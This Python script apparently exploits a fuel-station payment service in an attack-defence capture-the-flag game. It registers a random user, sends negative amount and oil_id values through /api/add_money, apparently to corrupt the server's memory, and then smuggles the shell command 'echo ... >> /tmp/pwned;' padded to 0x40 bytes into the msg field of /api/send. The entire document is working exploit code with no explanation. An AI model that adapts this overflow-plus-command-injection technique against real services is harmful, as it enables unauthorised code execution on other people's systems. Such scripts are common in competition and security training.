#!/usr/bin/env python3
import json
import random
import string
import sys

import requests

URL = f'http://{sys.argv[1]}:8087'

def register(u: str, p: str):
    r = requests.post(URL+'/api/register', json={'username':u,'password':p})
    return r.text

def login(u: str, p: str):
    r = requests.post(URL+'/api/login', json={'username':u,'password':p})
    return r.text

def send(uid: str, balance: int, fr: int, to: int, msg: str):
    r = requests.post(URL+'/api/send', json={'uid':uid,'receiver_id':uid,'msg':msg,'money':balance,'from':fr,'to':to})
    return r.text

def add_money(uid: str, amount: int, station_id: int, oil_id: int):
    r = requests.post(URL+"/api/add_money", json.dumps({"type":"ADD_MONEY","uid":uid,"amount":amount,"station_id":station_id,"oil_id":oil_id}))
    return r.text


u = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
uid = json.loads(register(u, u))['id']
add_money(uid, amount=-0x38af00, oil_id=-0x38, station_id=16018)
send(uid, balance=1, fr=16007, to=16018, msg='echo aaaaaaaaaaaaaaaaaaaaaa >> /tmp/pwned; '.ljust(0x40, ' '))
